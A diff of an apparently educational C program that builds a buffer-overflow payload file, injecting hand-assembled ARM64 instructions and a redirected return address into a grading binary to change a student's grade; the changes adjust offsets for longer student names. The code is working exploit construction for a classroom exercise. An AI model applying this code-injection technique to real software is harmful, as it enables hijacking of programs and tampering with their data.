@@ -30,15 +30,15 @@ int main(void)
     const unsigned long NAME_ADDR = 0x420058UL;
     const unsigned long GRADE_ADDR = 0x420044UL;
     const unsigned long PRINT_ADDR = 0x40089cUL;
-    unsigned long returnAddr = 0x420058UL + 8;
+    unsigned long returnAddr = 0x420058UL + 16;
 
     /* Memory address of start of printf */
     const unsigned long PRINTF_ADDR = 0x400690;
 
     f = fopen("dataAplus", "w");
 
-    /* Student initials: 2 bytes */
-    fprintf(f, "%s", "OB");
+    /* Student names: 10 bytes */
+    fprintf(f, "%s", "OwenAndBen");
 
     /* Null bytes for terminating string and padding */
     for (i = 0; i < 2; i++)
@@ -46,7 +46,7 @@ int main(void)
         fprintf(f, "%c", '\0');
     }
 
-    /* Format string to reference for printf calls */
+    /* Format string to reference for printf call */
     fprintf(f, "%c", '%');
     fprintf(f, "%c", 'c');
 
@@ -56,9 +56,9 @@ int main(void)
         fprintf(f, "%c", '\0');
     }
 
-    /* Counter starts after 2 name bytes, 2 bytes of format string,
+    /* Counter starts after 10 name bytes, 2 bytes of format string,
     and 4 null bytes */
-    pc = NAME_ADDR + 8;
+    pc = NAME_ADDR + 16;
 
     /* x0 <- &grade */
     instr = MiniAssembler_adr(0, GRADE_ADDR, pc);
@@ -76,7 +76,7 @@ int main(void)
     pc += 4;
 
     /* x0 <- address of start of format string */
-    instr = MiniAssembler_adr(0, NAME_ADDR + 4, pc);
+    instr = MiniAssembler_adr(0, NAME_ADDR + 12, pc);
     fwrite(&instr, 4, 1, f);
     pc += 4;
 
@@ -96,7 +96,7 @@ int main(void)
     pc += 4;
 
     /* More padding to fill up 48 bytes of buffer */
-    for (i = 0; i < 12; i++)
+    for (i = 0; i < 4; i++)
     {
         fprintf(f, "%c", '\0');
     }
